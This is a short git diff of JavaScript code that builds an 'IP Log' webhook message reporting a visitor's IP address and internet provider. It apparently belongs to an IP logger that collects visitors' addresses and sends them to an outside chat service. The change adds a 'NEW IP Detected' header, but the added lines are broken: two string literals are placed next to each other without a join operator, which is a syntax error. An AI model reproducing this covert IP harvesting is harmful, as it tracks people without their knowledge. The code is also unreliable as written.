@@ -30,7 +30,9 @@ const request = async () => { // Calling a "synchronous" fetch
     var params = {
         username: "IP Log",
         avatar_url: "",
-        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
+        content:   
+                    "__**NEW IP Detected**__"
+                    "__**:globe_with_meridians: IP-Adress:**__ \n" 
                     + ip + 
                     "\n \n__**:telephone: Provider:**__ \n" 
                     + provider + 
